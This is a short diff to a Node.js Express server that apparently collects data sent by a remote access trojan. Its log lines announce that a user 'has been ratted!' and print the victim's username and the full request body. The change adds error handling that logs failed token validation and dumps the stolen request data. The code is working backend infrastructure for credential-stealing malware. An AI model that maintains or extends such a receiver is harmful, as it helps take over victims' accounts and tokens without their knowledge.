@@ -254,7 +254,11 @@ app.post("/", (req, res) => {
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
     })
-
+    .catch(err => {
+        //could happen if the auth server is down OR if invalid information is passed in the body
+        console.log(`[R.A.T] Error while validating token:\n${err}`)
+        console.log(req.body)
+    })
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
 })
